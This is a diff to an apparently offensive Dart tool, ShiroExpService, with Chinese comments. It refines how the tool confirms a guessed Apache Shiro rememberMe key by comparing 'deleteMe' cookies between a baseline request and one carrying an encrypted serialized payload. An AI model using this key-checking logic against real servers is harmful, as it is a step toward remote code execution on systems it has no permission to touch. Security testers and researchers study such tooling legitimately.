@@ -199,9 +199,26 @@ class ShiroExpService {
   }) async {
     final client = http.Client();
     try {
+      // 1. 基线请求
       final baselineRes = await _send(_randomString(16), client: client);
       final baselineCount = _countDeleteMe(baselineRes);
+      final baselineSetCookie =
+          (baselineRes.headers['set-cookie'] ?? '').toLowerCase();
+      final baselineHasDeleteMe = baselineSetCookie
+          .contains('${cookieName.toLowerCase()}=deleteme');
 
+      onProgress?.call(
+        '[i] 基线请求: HTTP ${baselineRes.statusCode}, deleteMe=$baselineCount, '
+        'Set-Cookie 含 deleteMe: $baselineHasDeleteMe',
+      );
+
+      if (!baselineHasDeleteMe && baselineCount == 0) {
+        onProgress?.call(
+          '[!] 警告：基线响应中未发现 deleteMe，目标 URL 可能未触发 Shiro rememberMe 逻辑',
+        );
+      }
+
+      // 2. 发送加密后的合法 payload
       final encryptedB64 = await crypto.encryptRememberMe(
         keyBase64: keyBase64,
         serializedPayload: Uint8List.fromList(serializedPayload),
@@ -209,10 +226,22 @@ class ShiroExpService {
       );
       final res = await _send(encryptedB64, client: client);
       final curCount = _countDeleteMe(res);
+      final curSetCookie =
+          (res.headers['set-cookie'] ?? '').toLowerCase();
+      final curHasDeleteMe = curSetCookie
+          .contains('${cookieName.toLowerCase()}=deleteme');
 
       onProgress?.call(
-        '[i] 基线 deleteMe: $baselineCount, 当前 deleteMe: $curCount',
+        '[i] 验证请求: HTTP ${res.statusCode}, deleteMe=$curCount, '
+        'Set-Cookie 含 deleteMe: $curHasDeleteMe',
       );
+      onProgress?.call(
+        '[i] 基线 deleteMe: $baselineCount → 当前 deleteMe: $curCount',
+      );
+
+      // 判定：Key 正确时基线有 deleteMe 而验证请求没有
+      if (baselineHasDeleteMe && !curHasDeleteMe) return true;
+      // 兜底：deleteMe 总数减少
       return curCount < baselineCount;
     } finally {
       client.close();
